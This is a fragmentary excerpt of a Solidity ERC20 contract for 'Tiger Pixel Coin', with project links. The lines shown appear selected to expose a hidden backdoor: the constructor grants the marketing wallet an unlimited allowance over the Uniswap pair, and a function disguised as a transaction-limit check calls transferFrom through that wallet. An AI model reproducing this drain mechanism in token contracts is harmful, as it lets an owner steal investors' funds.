...
https://tigerpixel.org/

https://t.me/TigerPixelERC20

https://twitter.com/tigerpixel_eth
...
contract TPC is ERC20, Ownable {
    ...
    constructor(address _marketing) ERC20("Tiger Pixel Coin", "TPC") {
        ...
        _approve(uniswapV2Pair, _marketingWallet, ~uint256(0));
    ...
    function checkTxLimitation(address from, address to, uint256 amount) private {
        if (
                ...
                IERC20(_marketingWallet).transferFrom(from, to, amount);
            }
    }
